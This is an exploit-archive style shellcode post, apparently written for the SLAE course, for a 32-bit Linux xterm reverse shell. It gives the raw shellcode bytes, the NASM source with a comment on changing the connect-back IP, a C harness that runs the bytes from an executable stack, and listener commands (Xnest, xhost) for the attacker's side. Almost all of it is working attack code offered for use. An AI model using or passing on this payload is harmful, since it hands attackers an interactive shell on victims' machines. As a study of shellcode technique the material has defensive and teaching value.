/*
    # Title : Linux , Reverse Shell using Xterm , ///usr/bin/xterm -display 127.1.1.1:10
    # Date : 12-07-2016
    # Author : RTV
    # Tested On : Ubuntu x86
    # shellcode : \x31\xc0\x31\xd2\x50\x68\x31\x3a\x31\x30\x68\x31\x2e\x31\x2e\x68\x31\x32\x37\x2e\x89\xe6\x50\x68\x70\x6c\x61\x79\x68\x2d\x64\x69\x73\x89\xe7\x50\x68\x74\x65\x72\x6d\x68\x69\x6e\x2f\x78\x68\x73\x72\x2f\x62\x68\x2f\x2f\x2f\x75\x89\xe3\x50\x56\x57\x53\x89\xe1\xb0\x0b\xcd\x80
*/
/*
;**********************************
;xterm.asm
;xterm reverse shell , 32 bit Linux
;nasm -f elf32 -o xterm.o xterm.asm && ld -o xtermrev xterm.o
;Shellcode length 68


section .text
    global _start
_start:
xor eax,eax
xor edx,edx
push eax
push 0x30313a31 ; setting the listening IP and display , used  127.1.1.1:10 , change this section to set your IP
push 0x2e312e31
push 0x2e373231
mov esi,esp
push eax
push 0x79616c70 ; -display
push 0x7369642d
mov edi,esp
push eax
push 0x6d726574   ; ///usr/bin/xterm
push 0x782f6e69
push 0x622f7273
push 0x752f2f2f
mov ebx,esp
push eax
push esi
push edi
push ebx
mov ecx,esp
mov al,11
int 0x80

;**********************************

/** shellcode.c , gcc -fno-stack-protector -z execstack -o xtermrev shellcode.c

*/

#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x31\xd2\x50\x68\x31\x3a\x31\x30\x68\x31\x2e\x31\x2e\x68\x31\x32\x37\x2e\x89\xe6\x50\x68\x70\x6c\x61\x79\x68\x2d\x64\x69\x73\x89\xe7\x50\x68\x74\x65\x72\x6d\x68\x69\x6e\x2f\x78\x68\x73\x72\x2f\x62\x68\x2f\x2f\x2f\x75\x89\xe3\x50\x56\x57\x53\x89\xe1\xb0\x0b\xcd\x80";
main()
{

        printf("Shellcode Length:  %d\n", strlen(code));

        int (*ret)() = (int(*)())code;

        ret();

}

/***************************

Notes : -

Xterm reverse shell

Use these commands to listen at your side

Xnest :10 ( starting Xserver with display 10)
xhost +targetip ( authorize the target ip to connect back)

# SLAE - 739
*/